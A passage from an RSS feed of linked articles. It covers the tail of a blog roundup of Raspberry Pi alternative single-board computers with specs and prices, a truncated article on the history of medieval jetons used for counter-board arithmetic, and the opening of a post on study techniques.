<figure><img src="https://i0.wp.com/www.crowdsupply.com/img/bd22/hackboard-2-top-left_jpg_project-body.jpg?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i0.wp.com/www.crowdsupply.com/img/bd22/hackboard-2-top-left_jpg_project-body.jpg?w=750&amp;ssl=1" alt="" data-recalc-dims="1" data-old-src="https://i0.wp.com/www.crowdsupply.com/img/bd22/hackboard-2-top-left_jpg_project-body.jpg?w=750&amp;ssl=1" data-lazy-src="https://i0.wp.com/www.crowdsupply.com/img/bd22/hackboard-2-top-left_jpg_project-body.jpg?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Hackboard 2<br></figcaption></figure>



<h3>Details</h3>



<p>The Hackboard 2 is a newly crowdfunded mid sized SBC that is larger than the Raspberry Pi 4 model B at 120x80mm. <br></p>



<p>The specs are as follows:</p>



<ul><li>Dual Core Intel Celeron N4020 CPU</li><li>4GB DDR4 RAM</li><li>64GB EMMC</li><li>2x M.2 slots</li><li>Gigabit Ethernet</li><li>3x USB 3.0 Type B ports</li><li>HDMI</li><li>Audio Jack</li><li>40 pin Pi compatible GPIO</li><li>Wifi and bluetooth</li></ul>



<div><p>The board design is compact but functional featuring a Power button, LED power status/system LED and a small RTC battery. </p><p>Windows is installed out of the box and any x86 compatible Linux distributions can easily be installed.   </p><p>Keep an eye out for my upcoming review!</p></div>



<h3>Pricing</h3>



<p>The hackboard 2 starts at $99 Shipping with Ubuntu or $140 Shipped with Windows 10 Pro. This may seem pricey in comparison to the Raspberry Pi 4 Model B however the Windows 10 version is cheaper than a Windows 10 Pro Licence and almost any Linux distro or x86 OS is compatible out of the box. </p>



<p>The HackBoard 2 is available to purchase now at <a href="https://www.crowdsupply.com/hackboard/hb2" target="_blank" rel="noreferrer noopener">crowdsupply</a>.</p>



<h2><span id="ZimaBoard"></span>ZimaBoard<span></span></h2>



<figure><img src="https://i1.wp.com/www.zimaboard.com/img/product.png?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/www.zimaboard.com/img/product.png?w=750&amp;ssl=1" alt="ZimaBoard-Case" data-recalc-dims="1" data-old-src="https://i1.wp.com/www.zimaboard.com/img/product.png?w=750&amp;ssl=1" data-lazy-src="https://i1.wp.com/www.zimaboard.com/img/product.png?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Zimaboard With its passive heatsink/case</figcaption></figure>



<h3>Details</h3>



<p><br>Running a home server on a SBC isn’t anything new, I’ve personally been doing it since the release of the Raspberry Pi Model B in 2012. However no SBC has been designed specifically for this purpose. That is until now! The ZimaBoard is a SBC designed to be used for server applications and is available in two different configurations:<br></p>



<div><div>
<figure><table><tbody><tr><td>Spec</td><td>ZimaBoard 216</td><td>ZimaBoard 832</td></tr><tr><td>CPU</td><td>Intel Celeron N3350</td><td>Intel Celeron N3450</td></tr><tr><td>RAM</td><td>2GB LPDDR4</td><td>8G LPDDR4</td></tr><tr><td>Onboard Storage</td><td>16GB eMMC</td><td>32GB eMMC</td></tr><tr><td>HDD/SSD</td><td>2x SATA 6.0 Ports</td><td>2x SATA 6.0 Ports</td></tr><tr><td>LAN</td><td>2x GbE  Ports</td><td>2x GbE Ports</td></tr><tr><td>USB</td><td>2x USB 3.0 Ports</td><td>2x USB 3.0 Ports</td></tr><tr><td>PCI-E</td><td>1x PCIe 2.0 4x</td><td>1x PCIe 2.0 4x</td></tr><tr><td>Display</td><td>1x Mini Display Port 1.2</td><td>1x Mini Display Port 1.2</td></tr><tr><td>TDP</td><td>6w</td><td>6w</td></tr><tr><td>Dimensions</td><td>120 x 74.5 x 25 mm</td><td>120 x 74.5 x 25 mm</td></tr></tbody></table><figcaption>ZimaBoard Specs</figcaption></figure>



<div><p>The ZimaBoard is small, fanless and very low powered with its 6w Apollo lake CPU making it perfect as a lightweight home server. </p><p>Whilst the ZimaBoard has not yet been funded it is expected to be released at some point during 2021. </p><p>Check out my press release on the ZimaBoard <a href="https://blog.jmdawson.co.uk/zimaboard-a-70-single-board-home-server/" target="_blank" rel="noreferrer noopener">here</a></p></div>



<h3>Pricing</h3>



<p>Both models will soon be available to back on kickstarter priced at $69.90 and $129.90 respectively.</p>
</div></div>



<h2><span id="RockPi_4_Model_B"></span>RockPi 4 Model B<span></span></h2>



<figure><img src="https://i0.wp.com/media-green.seeedstudio.site/media/catalog/product/cache/9d0ce51a71ce6a79dfa2a98d65a0f0bd/1/0/102991278-6.jpg?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i0.wp.com/media-green.seeedstudio.site/media/catalog/product/cache/9d0ce51a71ce6a79dfa2a98d65a0f0bd/1/0/102991278-6.jpg?w=750&amp;ssl=1" alt="" data-recalc-dims="1" data-old-src="https://i0.wp.com/media-green.seeedstudio.site/media/catalog/product/cache/9d0ce51a71ce6a79dfa2a98d65a0f0bd/1/0/102991278-6.jpg?w=750&amp;ssl=1" data-lazy-src="https://i0.wp.com/media-green.seeedstudio.site/media/catalog/product/cache/9d0ce51a71ce6a79dfa2a98d65a0f0bd/1/0/102991278-6.jpg?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>RockPi 4</figcaption></figure>



<h3>Details</h3>



<p>The Rock Pi 4 is a small SBC that uses the same form factor as the Raspberry Pi Model B. Featuring a Hex Core Rockchip RK3399 it is very powerful for the form factor and price. <br></p>



<p>The Specs are as follows:</p>



<ul><li>1.8Ghz 6 Core 64Bit Rockchip RK3399 CPU</li><li>LPDDR4 RAM Available in:<ul><li>1GB</li><li>2GB</li><li>4GB</li></ul></li><li>Storage<ul><li>Optional EMMC Module in 8,16,32,64 and 128GB</li><li>Micro SD Card</li><li>NVME M.2 Connector supporting up to 2TB SSD</li></ul></li><li>3.5mm Audio Jack</li><li>802.11 ac wifi</li><li>Bluetooth 5.0</li><li>2x USB 3.0</li><li>2x USB 2.0</li><li>GbE NIC with PoE Support (Additional HAT required for POE)</li></ul>



<h3>Pricing</h3>



<p>The RockPi 4 starts at $49 for the 1GB Model, $59 for the 2GB Model and $75 for the 4GB Model. <br></p>



<p>The RockPi 4 is available to purchase on <a href="https://www.amazon.co.uk/gp/product/B07XD8HZBY/ref=as_li_tl?ie=UTF8&amp;camp=1634&amp;creative=6738&amp;creativeASIN=B07XD8HZBY&amp;linkCode=as2&amp;tag=jmdawsonblog1-21&amp;linkId=1026f70c5b125cfadf15c563c959d9bf" target="_blank" rel="noreferrer noopener sponsored nofollow">Amazon</a>. </p>



<h2><span id="ODROIDH2+"></span> ODROID-H2+<span></span></h2>



<figure><img src="https://i2.wp.com/www.odroid.co.uk/image/cache/catalog/liymo/odroid/ODROID-H2/odroid-h2-500x500.jpg?resize=500%2C500&amp;is-pending-load=1#038;ssl=1" data-src="https://i2.wp.com/www.odroid.co.uk/image/cache/catalog/liymo/odroid/ODROID-H2/odroid-h2-500x500.jpg?resize=500%2C500&amp;ssl=1" alt="Odroid-H2+ [77800]" data-recalc-dims="1" data-old-src="https://i2.wp.com/www.odroid.co.uk/image/cache/catalog/liymo/odroid/ODROID-H2/odroid-h2-500x500.jpg?resize=500%2C500&amp;ssl=1" data-lazy-src="https://i2.wp.com/www.odroid.co.uk/image/cache/catalog/liymo/odroid/ODROID-H2/odroid-h2-500x500.jpg?resize=500%2C500&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>ODROID-H2+</figcaption></figure>



<h3>Details</h3>



<p>The ODROID-h2+ is a Quad core x86 board featuring a 2.5Ghz Intel J4115 CPU. Whilst this is not strictly a SBC due to the removable memory DIMMS it is still fitting with this list although the lack of GPIO may make it unsuitable for some projects. <br></p>



<p>Due to the Dual Nics this would make a great software router or home server.</p>



<h3>Specs</h3>



<ul><li>Intel Quad-core processor J4115 (14nm) with 4MiB Cache, up to 2.5Ghz(Single Thread) or 2.3Ghz(Multi Thread)</li><li>Dual-channel Memory DDR4-PC19200 (2400MT/s)</li><li>Total 32GiB RAM Space with two SO-DIMM slots</li><li>4 x PCIe 2.0 for one M.2 NVMe storage</li><li>2 x 2.5Gbit Ethernet ports</li><li>2 x SATA 3.0</li><li>SSE4.2 accelerator (SMM, FPU, NX, MMX, SSE, SSE2, SSE3, SSSE3, SSE4.1, SSE4.2, AES)</li><li>Intel UHD Graphics 600 (Gen9.5 LP GT1) up to 700Mhz</li><li>HDMI 2.0 and DP 1.2 multiple 4K/60Hz video outputs</li><li>RTC / BIOS backup battery is included</li></ul>



<h3>Pricing</h3>



<p>The ODROID-h2+ is available at $119.00 although keep in mind you will need to purchase DDR4-PC19200&nbsp; SODIMM RAM separately.<br></p>



<p>The ODROID-h2+ is available to purchase in the UK <a href="https://www.odroid.co.uk/ODroid-H2" target="_blank" rel="noreferrer noopener">here</a> or for the rest of the world <a href="https://www.hardkernel.com/shop/odroid-h2plus/" target="_blank" rel="noreferrer noopener">here</a>. <br></p>



<h2><span id="NanoPi_R4S"></span>NanoPi R4S<span></span></h2>



<figure><img src="https://i1.wp.com/www.friendlyarm.com/image/cache/catalog/details/R4S_01-900x630.jpg?resize=750%2C525&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/www.friendlyarm.com/image/cache/catalog/details/R4S_01-900x630.jpg?resize=750%2C525&amp;ssl=1" alt="" data-recalc-dims="1" data-old-src="https://i1.wp.com/www.friendlyarm.com/image/cache/catalog/details/R4S_01-900x630.jpg?resize=750%2C525&amp;ssl=1" data-lazy-src="https://i1.wp.com/www.friendlyarm.com/image/cache/catalog/details/R4S_01-900x630.jpg?resize=750%2C525&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>The NanoPi R4S is a tiny SBC designed to be used as a firewall or router featuring the Hex Core RK3399 CPU and Dual Gigabit Ethernet. The friendly ARM range isn’t new to me and their support is fantastic. Check out my previous review of their <a href="https://blog.jmdawson.co.uk/nanopi-fire-3-review/" target="_blank" rel="noreferrer noopener">NanoPi Fire 3</a>.</p>



<h3>Specs</h3>



<ul><li>1.8Ghz 6 Core 64Bit Rockchip RK3399 CPU</li><li>1GB DDR3 or 4GB LPDDR4 RAM</li><li>MicroSD Storage</li><li>Dual Gigabit NICs</li><li>2x USB 3.0 Type A</li><li>MicroSD Card Storage</li></ul>



<h3>Pricing</h3>



<p>The NanoPi R4s Starts at $45 for the 1GB model and $69 for the 4GB Model.</p>



<p>The NanoPi R4S is available directly from friendly arm <a href="https://www.friendlyarm.com/index.php?route=product/product&amp;product_id=284" target="_blank" rel="noreferrer noopener">here</a></p>



<h2><span id="ZeroPi"></span>ZeroPi<span></span></h2>



<figure><img src="https://i2.wp.com/www.friendlyarm.com/image/cache/catalog/details/ZeroPi_03-900x630.jpg?resize=750%2C525&amp;is-pending-load=1#038;ssl=1" data-src="https://i2.wp.com/www.friendlyarm.com/image/cache/catalog/details/ZeroPi_03-900x630.jpg?resize=750%2C525&amp;ssl=1" alt="" data-recalc-dims="1" data-old-src="https://i2.wp.com/www.friendlyarm.com/image/cache/catalog/details/ZeroPi_03-900x630.jpg?resize=750%2C525&amp;ssl=1" data-lazy-src="https://i2.wp.com/www.friendlyarm.com/image/cache/catalog/details/ZeroPi_03-900x630.jpg?resize=750%2C525&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>The ZeroPi is another product from Friendly Arm starting at the very low price of just $9.99. Featuring a Quad-core Allwinner H3 CPU running at 1.2Ghz. Although there is no GPIO making it useless for some projects for anyone wanting a low powered very cheap Linux SBC this is a bargain! </p>



<h3>Specs</h3>



<ul><li>1.2Ghz Quad Core Allwinner H3 CPU</li><li>512MB DDR3 RAM</li><li>MicroSD Slot for storage</li><li>Gigabit Ethernet</li><li>1x USB 2.0</li></ul>



<h3>Pricing</h3>



<p>The ZeroPi is available now for $9.99 or for an extra $3 you can have a nice metal enclosure. </p>



<p>Available to purchase now at <a href="https://www.friendlyarm.com/index.php?route=product/product&amp;product_id=266&amp;search=zeropi&amp;description=true&amp;category_id=0&amp;sub_category=true" target="_blank" rel="noreferrer noopener">Friendly Arm</a></p>



<h2><span id="NVIDIA_Jetson_Nano"></span>NVIDIA Jetson Nano<span></span></h2>



<figure><img src="https://i1.wp.com/developer.nvidia.com/sites/default/files/akamai/embedded/images/jetsonNano/JetsonNano-DevKit_Front-Top_Right_trimmed.jpg?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i1.wp.com/developer.nvidia.com/sites/default/files/akamai/embedded/images/jetsonNano/JetsonNano-DevKit_Front-Top_Right_trimmed.jpg?w=750&amp;ssl=1" alt="Jetson Nano Developer Kit" data-recalc-dims="1" data-old-src="https://i1.wp.com/developer.nvidia.com/sites/default/files/akamai/embedded/images/jetsonNano/JetsonNano-DevKit_Front-Top_Right_trimmed.jpg?w=750&amp;ssl=1" data-lazy-src="https://i1.wp.com/developer.nvidia.com/sites/default/files/akamai/embedded/images/jetsonNano/JetsonNano-DevKit_Front-Top_Right_trimmed.jpg?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>The NVIDIA Jetson Nano is the latest in the line of NVIDIA SBC Development Kits featuring a Quad Core Arm A57 @ 1.43GHz and a 128 Core Maxwell GPU. </p>



<h3>Specs<br></h3>



<ul><li>128 Core Maxwell GPU</li><li>1.43GHz Quad Core A57 CPU</li><li>4GB LPDDR4 RAM</li><li>MicroSD Storage</li><li>Gigabit Ethernet</li><li>HDMI</li></ul>



<h3>Pricing</h3>



<p>The NVIDIA Jetson Nano is available for £64 from <a href="https://www.amazon.co.uk/gp/product/B08J157LHH/ref=as_li_tl?ie=UTF8&amp;camp=1634&amp;creative=6738&amp;creativeASIN=B08J157LHH&amp;linkCode=as2&amp;tag=jmdawsonblog1-21&amp;linkId=5fccf89294b3c2fbd9e717042f2bd603" target="_blank" rel="noreferrer noopener sponsored nofollow">Amazon UK</a> or for around $90 in the rest of the world. </p>



<h2><span id="Asus_Tinker_Board"></span>Asus Tinker Board &nbsp;<span></span></h2>



<figure><img src="https://i2.wp.com/90a1c75758623581b3f8-5c119c3de181c9857fcb2784776b17ef.ssl.cf2.rackcdn.com/475761_248732_01_front_zoom.jpg?w=750&amp;is-pending-load=1#038;ssl=1" data-src="https://i2.wp.com/90a1c75758623581b3f8-5c119c3de181c9857fcb2784776b17ef.ssl.cf2.rackcdn.com/475761_248732_01_front_zoom.jpg?w=750&amp;ssl=1" alt="" data-recalc-dims="1" data-old-src="https://i2.wp.com/90a1c75758623581b3f8-5c119c3de181c9857fcb2784776b17ef.ssl.cf2.rackcdn.com/475761_248732_01_front_zoom.jpg?w=750&amp;ssl=1" data-lazy-src="https://i2.wp.com/90a1c75758623581b3f8-5c119c3de181c9857fcb2784776b17ef.ssl.cf2.rackcdn.com/475761_248732_01_front_zoom.jpg?w=750&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Asus Tinker Board</figcaption></figure>



<p>The ASUS Tinker Board is ASUS’ first commercial SBC designed as a direct competitor to the Raspberry Pi Model B. Although this board is using ageing technology it is still a viable alternative down to the level of documentation and support provided by ASUS. <br></p>



<h3>Specs</h3>



<ul><li>Rockchip Quad-Core RK3288 processor</li><li>2GB Dual Channel DDR3</li><li>MicroSD Storage</li><li>802.11 WIFI</li><li>Bluetooth 4.0</li><li>Gigabit Ethernet</li><li>40-pin Pi compatible GPIO</li></ul>



<h3>Pricing</h3>



<p>The ASUS Tinker Board is priced at around £40 in the UK and can be purchased on <a href="http://uct/B06VSBVQWS/ref=as_li_tl?ie=UTF8&amp;camp=1634&amp;creative=6738&amp;creativeASIN=B06VSBVQWS&amp;linkCode=as2&amp;tag=jmdawsonblog1-21&amp;linkId=acaac47fe896ec85341ec08c83f900a2" target="_blank" rel="noreferrer noopener sponsored nofollow">Amazon</a>.</p>



<p>Pricing for the rest of the world is around $60</p>



<h2><span id="Sipeed_XuanTie_C906"></span>Sipeed XuanTie C906<span></span></h2>



<p>Little is known about the Sipeed XuanTie C906 as it is yet to be released however it looks to be the first budget SBC to use the RISC-V architecture making it somewhat special. </p>



<p>The only details available for this board were released back in November of 2020 in a tweet however I have spoken to sipeed and they confirmed the following: <br></p>



<p><em>Hello,<br>We will release it in February, please keep following us on twitter, we will update in time on twitter.Thank you very much for your support and attention to us.<br>Best regards,<br>Orgmar<br><a href="http://www.sipeed.com/" target="_blank" rel="noreferrer noopener">www.sipeed.com</a></em></p>



<blockquote><p lang="en" dir="ltr">Good News: <br>We get first chip which based on XuanTie C906 (RV64GCV), <br>it have abundant interface (HDMI/RGB/DVP/MIPI/GMAC/…), <br>and will be able to run Debian system.<br>Last and most important, the basic dev board price is start at 12.5$ (1% of HiFive Unleashed)。 <a href="https://t.co/EJbXTJ5eMb">pic.twitter.com/EJbXTJ5eMb</a></p>— Sipeed (@SipeedIO) <a href="https://twitter.com/SipeedIO/status/1324632751157374977?ref_src=twsrc%5Etfw">November 6, 2020</a></blockquote> 



<h2><span id="Conclusion"></span>Conclusion <span></span></h2>



<p>If you are looking at Raspberry Pi alternatives in 2021 there is a range of options at various specifications and prices. Although at the time of writing some of these options are yet to be released I believe that they will be relevant within the next few months. </p>



<p>Raspberry Pi alternatives have always been an interest to me as they often create innovating products before the Raspberry Pi foundation. This is not to say I have anything against Raspberry Pi’s they are absolutely the well deserved leader in this market and still offer the best support and community. </p>



<div><p>If anyone believes I have missed a Raspberry Pi alternative from the list please comment below and I will review it and potentially add it to the list. </p><p>Watch this space as a good amount of the SBC’s mentioned in this list will be reviewed by myself in early 2021.   </p></div>

	</div><!-- .entry-content -->

	<!-- .entry-footer -->

				
</article></div>]]>
            </description>
            <link>https://blog.jmdawson.co.uk/9-raspberry-pi-alternatives-in-2021-hackboard-zimaboard-rockpi-odroid-and-more/#NVIDIA_Jetson_Nano</link>
            <guid isPermaLink="false">hacker-news-small-sites-25569407</guid>
            <pubDate>Tue, 29 Dec 2020 13:09:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Jetons: Their Use and History (1986)]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25569286">thread link</a>) | @prox
<br/>
December 29, 2020 | http://www.chicagocoinclub.org/projects/PiN/juh.html | <a href="https://web.archive.org/web/*/http://www.chicagocoinclub.org/projects/PiN/juh.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
Jetons or counters were used as calculation instruments in
Europe in the middle ages. According to medieval taste, they
were always decorated. These decorations always had a
purpose, sometimes religious, but usually related to the user or the
principal. In the 16th century, jetons were mostly used to
propagate political messages and to glorify the deeds of the ruler.
There was such a great need to make propaganda through jetons
that they continued to be struck long after jetons ceased to be used
as counters. In France and in the Netherlands this new image of
the jeton began about the end of the 16th century. The jeton
became a small commemorative medal only suitable as a collectors
item. The development in Germany was slightly different.
In the course of the 17th century the counters became smaller
and smaller, for little by little they were only used as chips for
card-playing. Real jetons are metallic thin flat discs and are
struck like coins. The differences from coins are: the metal is
generally copper or brass and seldom silver. Gold jetons are very
rare. The measure is always between ca. 20 mm and ca. 28 mm.
Smaller or larger pieces cannot be used as reckoning counters.
The relief is always low for easy pushing and making piles. (In
France the jetons were mostly laid down overlapping, as shown
in the figure). Jetons are not coins, so they never have an indication
of value.
</p><p>
The copper jeton shown in
<a href="http://www.chicagocoinclub.org/projects/PiN/jet1.jpg">Figure 1</a>
is a good example of a
reckoning counter of the Low Countries of the 16th century. The
type on the obverse is heraldic. The legend gives the name and
the title of the principal of this jeton, Maximilian of Bergen op
Zoom, bishop of Cambray (now in France). The legend of the
reverse is the motto of the bishop: "neither quick nor rash,"
which is symbolized by a beautiful clock. The jeton is dated as
usual in this period.
</p><p>
In ancient times the Greeks and Romans mostly used pebbles or
bone disks for their calculations. This was cheaper than a
beadframe, although we know that the Romans also used abaci.
Usually the pebbles were half bulb-shaped pieces of limestone.
The Romans called them "calculi" (singular: calculus =
limestone, pebble), the origin of our word "calculation." In
counting the pebbles were pushed over a counter-board with
lines. The counter-board was used in the same way as the
counter-frame.
</p><p>
Calculating with jetons was always accompanied by registering
the numbers in Roman figures.
</p><p>
There were no strict rules for higher numbers. XXVIII.CCCCXXXII
and XXVIII<sup>m</sup>IIII<sup>c</sup>XXXII were both possible for 28,432.
Abbreviations as MCM for 1900 were not usual in the middle-ages.
</p><p>
After the fall of the Roman Empire, international trade was
reduced, therefore the need of calculating became less.
However, thanks to churches and convents which had to figure
out the dates of the changing church festivals, calculating with
jetons had not been forgotten and the revival of trade in
Northern Italy and France in the 12th and 13th centuries made it
necessary again. In the meantime in Western Europe the
beadframe abacus had definitely made room for the jetons which
were exclusively made of metal and usually, just like coins,
struck in copper and brass.
</p><p>
The calculating took place on a board with lines.
Counter-boards with inlaid lines have been kept through the ages in
private collections or museums. A cloth with embroidered lines
was used very incidentally (for example at the yearly verification
of the city-accounts) because of the quick wear and tear.
</p><p>
<a href="http://www.chicagocoinclub.org/projects/PiN/jet2.gif">Figure 2</a>
is a woodcut from Gregor Reisch's <em>Margarita
Philosophica</em>, Freiburg, 1503, an early German book about
arithmetic. Here "Arithmetica" is symbolized by a woman
holding two books with the two different ways of calculation.
The mathematician Pythagoras is shown calculating with jetons
on a counter-table, while the philosopher Boethius is ciphering
with Arabic figures.
<a href="http://www.chicagocoinclub.org/projects/PiN/jeta.gif">Figure a</a>
shows a counter-board with the
figure 123. The cross at the fourth line, or thousand-line, was
intended to help the eye like the comma that marks off the
thousands in Arabic figures.
</p><p>
<a href="http://www.chicagocoinclub.org/projects/PiN/jet3.jpg">Figure 3</a>
shows the same figure 123 on a reckoning-cloth,
made by the wife of the author.
</p><p>
In the course of the 13th century scientists of Western
Europe gradually learned how to make use of Arabic figures and
discovered the meaning of the figure zero (= an empty space on
the counter-board). Now also the Christian world knew how to
make calculations by pen-reckoning and the abacus and Roman
figures were no longer needed. It still took a few centuries before
everyone at school learned how to pen-reckon. Invention of the
printing-press quickened this process. Printed arithmetic books
reached many more people than had ever been possible through
oral instructions. Below are some examples of calculating with
jetons or counters. Here is dealt with only the most simple form
of plain calculation. Other systems were used for money-counting.
</p><div>
Put the figures down, separated by the vertical line.
(<a href="http://www.chicagocoinclub.org/projects/PiN/jetb.gif">figure b</a>)
<p>
Actually we already have the answer, but after simplification
the result is shown much clearer: Remove 5 counters from
the bottom line and put instead a counter in the V-space between
the I-line and the X-line. This one together with the counter
already being in the V-space are replaced by one counter on the
X-line. Now we have five counters on the X-line which we
replace by one in the L-space. (If you cannot see through
anymore there is only one solution: Draw a few lines on a piece
of paper and do the addition yourself with a few dimes or
something like it.) Finally we replace the two L-counters by one
on the C-line and we see the number CCCI or 301.
(<a href="http://www.chicagocoinclub.org/projects/PiN/jetc.gif">figure c</a>)
</p><p>
Subtraction is done in the same way.
</p><center>
<h2>
MULTIPLICATION
</h2>
</center>
<p>
It is more difficult to multiply and divide. Yet the operations
on the counter-board are easier to understand than
pen-reckoning. Example: CCLXXXV x XXIII (285 x 23 = )
Put down both figures
(<a href="http://www.chicagocoinclub.org/projects/PiN/jet5.jpg">Figure 5</a>).
</p><p>
First we multiply 285 by 10. In Arabic figures a zero is added
to 285: 285 x 10 = 2850. On the counter-board it is as easy. Push
all the counters one line up
(<a href="http://www.chicagocoinclub.org/projects/PiN/jet6.jpg">Figure 6</a>,
right).
Double this result, which makes the multiplication 20 times
(<a href="http://www.chicagocoinclub.org/projects/PiN/jet7.jpg">Figure 7</a>).
First simplify. To indicate that we have multiplied by 20,
we remove the 2 X-counters from 23.
(<a href="http://www.chicagocoinclub.org/projects/PiN/jet8.jpg">Figure 8</a>).
</p><p>
Multiplying by 3 is done the easiest on the left side of the
board. 3 x 285 is carried out as 3 x 200 + 3 x 80 + 3 x 5
(<a href="http://www.chicagocoinclub.org/projects/PiN/jet9.jpg">Figure 9</a>).
</p><p>
Finally the two figures are joined, see
<a href="http://www.chicagocoinclub.org/projects/PiN/jet10.jpg">Figure 10</a>,
and simplified
(<a href="http://www.chicagocoinclub.org/projects/PiN/jet11.jpg">Figure 11</a>).
</p><p>
You may verify the result with pen-reckoning or calculator
(<a href="http://www.chicagocoinclub.org/projects/PiN/jet12.jpg">Figure 12</a>).
</p><center>
<h2>
DIVISION
</h2>
</center>
<p>
The arithmetic book of Robert Recorde, <em>The Grounds of
Artes Teaching the Worke and Practice of Arithmetik</em>, first
published in 1542 in London, provides us with the last example. This
book contains not only the teaching of pen-reckoning but also
how the old method with counters could be used together with
the new Arabic figures. "If 225 sheepe cost 45&nbsp;£, what did
each sheep cost? To know this, I should divide the whole
somme, that is 45&nbsp;£ by 225, but that cannot be: Therefore must I
first reduce that 45&nbsp;£ into a lesser denomination, as into shillings,
then I multiplie 45 by 20, and it is 900: these two numbers
therefore I set thus.
(<a href="http://www.chicagocoinclub.org/projects/PiN/jetd.gif">figure d</a>)
</p><p>
Then I begin at the highest line of the dividend, and seeke
how often I may have the divisor therein, and that I may doe
foure times..." The explanation that follows is not very clear.
Probably Recorde hasn't calculated with counters very often
himself. Division is explained only in a few of the arithmetic
books from the 16th century that I consulted.
</p><p>
According to those books the pupil had to do by heart all the
multiplications that were necessary for dividing; only subtraction
was done on the counter-board. We may say that dividing
was one of the least practised operations.
</p><p>
To understand by experience, I divided XXVIII.CCCCXXXII
by CCCVII (28,432 divided by 357). Including laying out the
necessary multiplications it took about 10 minutes before I
found out that the answer was LXXVIIII with a remainder of
CCXXVIIII. I needed 43 counters for this calculation. It seemed
sensible to do the verification by a calculator.
</p><p>
A trained reckoner could probably do it much faster,
although a counter-board was always slower than a bead-frame
abacus, for pushing is done more quickly than putting down and
taking away.
</p><p>
In his <em>The Japanese Abacus</em> (1954), Takashi Kojima describes
a contest between the Japanese abacus or soroban and the
electric calculating machine (not a modern electronic one!) which
was held in Tokyo on November 12, 1946 under the sponsorship
of the U.S. Army newspaper, the <em>Stars and Stripes</em>. In reporting
the contest, the <em>Stars and Stripes</em> remarked: "The machine age
took a step backward yesterday at the Ernie Pyle Theater as the
abacus, centuries old, dealt defeat to the most up-to-date electric
machine now being used by the United States government ...
The abacus victory was decisive."
</p><p>
<a href="http://www.chicagocoinclub.org/projects/PiN/jet13.jpg">Figure 13</a>
is a small modern Japanese soroban with bamboo
rods and with four beads on the lower section and one on the
upper. Each of the four beads on the lower section of a rod has the
value of 1, while the bead on the upper section of the rod has the
value of 5. Each of the 1-unit beads below the beam obtains its
value when it is moved up toward the beam, and loses its value
when it is moved back down. The 5-unit bead obtains its value
when it is moved down to the beam, etc. The soroban in the
illustration shows the figure 123.
</p><p>
One of the different systems of counting with jetons is shown in
<a href="http://www.chicagocoinclub.org/projects/PiN/jet14.jpg">Figure 14</a>.
This is the title page of Robrecht van
Heusden's <em>Reken-boechsken</em>, Antwerp, 16th century. At the far
left is laid down a column (vertical) of jetons, generally called the
"tree." The lowest marks the row of unit jetons, the next above
the ten jetons, and so on. The five jeton has to be placed in the
space between the lowest and the second jeton of the tree.
</p><center>
<h2>
THE FIRST JETONS
</h2>
</center>
<p>
The word jeton for counter comes from the French verb</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.chicagocoinclub.org/projects/PiN/juh.html">http://www.chicagocoinclub.org/projects/PiN/juh.html</a></em></p>]]>
            </description>
            <link>http://www.chicagocoinclub.org/projects/PiN/juh.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25569286</guid>
            <pubDate>Tue, 29 Dec 2020 12:54:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: The Most Effective Ways to Study – According to Science]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25569168">thread link</a>) | @0d8556
<br/>
December 29, 2020 | http://studyhealthy.org/the-most-effective-ways-to-study-according-to-science/admin/ | <a href="https://web.archive.org/web/*/http://studyhealthy.org/the-most-effective-ways-to-study-according-to-science/admin/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<h5>There are many ways you can study, some of them, more effective than others. There are many different opinions on this topic, I myself, mostly believe in science and researches. So, here I’m&nbsp;going to share with you a few different techniques on how to study, as effectively as possible, according to science.</h5>



